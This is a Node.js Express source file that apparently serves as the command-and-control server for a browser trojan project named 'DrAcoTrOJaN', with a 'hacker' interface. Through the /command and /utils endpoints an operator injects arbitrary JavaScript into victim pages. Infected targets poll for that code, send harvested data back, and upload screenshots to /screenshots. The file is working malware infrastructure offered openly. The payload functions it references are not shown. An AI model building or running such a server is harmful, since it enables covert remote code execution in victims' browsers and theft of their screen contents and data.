const express = require('express');
const app = express();
const cors = require('cors');

const multer  = require('multer');
var storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'screenshots/');
  },
  filename: function (req, file, cb) {
    cb(null, Date.now() + '.jpg') //Appending .jpg
  }
})

const upload = multer({ dest: 'screenshots/', storage: storage })

const utils = require('./utilities.js')

const util_descriptions = require('./utilities.js')
// remove the functions from utils to send to the hacker_ui --> ISSUE: REMOVES FOR "utils" as well
// for(let dict of util_descriptions){
//   delete dict.func;
// }

const path = require('path');

const port = 3000

app.use(cors())
app.use(express.json())
app.use(express.urlencoded())

// By default, activate with first function
const activeFuncs = {
  "function": utils[0].func.toString(),
}

// Hacker will send the javascript content to server
app.post('/', (req, res) => {
  activeFuncs.function = req.body.function;
  res.send("Function injected");
})

// send the list of utility functions to the client
app.get('/utils', (req, res) => {
  res.send(util_descriptions)
})

// Sets the index of the function that hacker wantes to inject
app.post('/utils', (req, res) => {
  const index = parseInt(req.body.index);
  if (index < 0 || index >= utils.length) {
    res.send("Wrong index...");
  }
  else {
    activeFuncs.function = utils[index].func.toString();
    res.send("Function injected");
  }
})

// Sends the code to be injected to the "target"
app.get('/command', (req, res) => {
  if (activeFuncs.function !== null) {
    res.send(activeFuncs)
  }
})

app.post('/command', (req, res) => {
  console.log(req.body.data)
  res.send('Got a POST request')
})

app.post('/screenshots', upload.single("screenshot"), function (req, res, next) {
  res.send('Got a POST request')
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})


// Get UI related files - images, html, css, js, ttf
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'hacker_ui/index.html'));
})

app.get('/utils.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'hacker_ui/utils.html'));
})

app.get('/creators.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'hacker_ui/creators.html'));
})

app.get('/hack.ttf', (req, res) => {
  res.sendFile(path.join(__dirname, 'hacker_ui/hack.ttf'));
})

app.get('/hacker.css', (req, res) => {
  res.sendFile(path.join(__dirname, 'hacker_ui/hacker.css'));
})

app.get('/dragon.png', (req, res) => {
  res.sendFile(path.join(__dirname, 'hacker_ui/dragon.png'));
})

app.get('/creators.jpeg', (req, res) => {
  res.sendFile(path.join(__dirname, 'hacker_ui/creators.jpeg'));
})

app.get('/html2canvas.min.js', (req, res) => {
  res.sendFile(path.join(__dirname, 'html2canvas.min.js'));
})

app.get('/hacker.js', (req, res) => {
  res.sendFile(path.join(__dirname, 'hacker_ui/hacker.js'));
})

app.get('/utils.js', (req, res) => {
  res.sendFile(path.join(__dirname, 'hacker_ui/utils.js'));
})

app.get('/DrAcoTrOJaN_ti9x9ydcl63coiq.txt', (req, res) => {
  res.sendFile(path.join(__dirname, 'files/DrAcoTrOJaN_ti9x9ydcl63coiq.txt'));
})